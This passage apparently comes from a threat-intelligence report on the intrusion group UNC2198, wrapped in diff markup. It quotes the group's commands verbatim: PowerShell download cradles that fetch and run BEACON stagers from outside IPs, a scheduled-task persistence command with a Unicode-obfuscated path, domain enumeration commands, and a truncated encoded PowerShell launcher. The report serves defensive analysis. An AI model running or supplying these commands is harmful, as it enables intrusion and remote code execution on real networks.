@@ -1,0 +1,16 @@
+
+REG_DWORD /d 9633 & exit cmd.exe /c set XlOLqhCejHbSNW=8300 & reg add HKCU\\SOFTWARE\\WaMgGneKhtgTTy /v
+LbmWADsevLywrkP /t
+REG_DWORD /d 3809 & exit These example commands are non-functional, as they do not modify or alter payload execution.
+Another technique involves installing BEACON using a file path containing mixed Unicode-escaped and ASCII characters to evade detection: Unicode Escaped C:\\ProgramData\\S\\u0443sH\\u0435\\u0430ls\\T\\u0430s\\u0441host.exe Unicode Unescaped
+C:\\ProgramData\\SуsHеаls\\Tаsсhost.exe
+The executable was then executed by using a Scheduled Task named shadowdev : cmd.exe /c schtasks /create /sc minute /mo
+1 /tn shadowdev /tr
+C:\\\\ProgramData\\\\S\\u0443sH\\u0435\\u0430ls\\\\T\\u0430s\\u0441host.exe While the previous examples are related to compiled executables, UNC2198 has also used simple PowerShell download cradles to execute Base64-encoded and compressed BEACON stagers in memory: powershell -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://5.149.253[.]199:80/auth')) powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\"hxxp://185.106.122[.]167:80/a\")) powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('hxxp://195.123.233[.]157:80/casino'))\" Discovery and Reconnaissance UNC2198 has exhibited common TTPs seen across many threat groups during discovery and reconnaissance activities.
+UNC2198 has used the BloodHound active directory mapping utility during intrusions from within the “ C:\\ProgramData ” and “ C:\\Temp ” directories.
+The following are collective examples of various commands executed by UNC2198 over time to enumerate a compromised environment: arp -a whoami /groups whoami.exe  /groups /fo
+csv whoami /all net user < Redacted > net groups \"Domain Admins\" /domain net group \"Enterprise admins\" /domain net group \"local admins\" /domain net localgroup \"administrators\" /domain
+nltest /domain_trusts nltest /dclist:< Redacted > Lateral Movement and Privilege Escalation UNC2198 has used Windows Remote Management and RDP to move laterally between systems.
+UNC2198 has also performed remote execution of BEACON service binaries on targeted systems to move laterally.
+UNC2198 launches SMB BEACON using PowerShell, executing command lines such as the following: C:\\WINDOWS\\system32\\cmd.exe /b /c start /b /min
+powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALAB bAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AH MASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwA3ADIALw...<
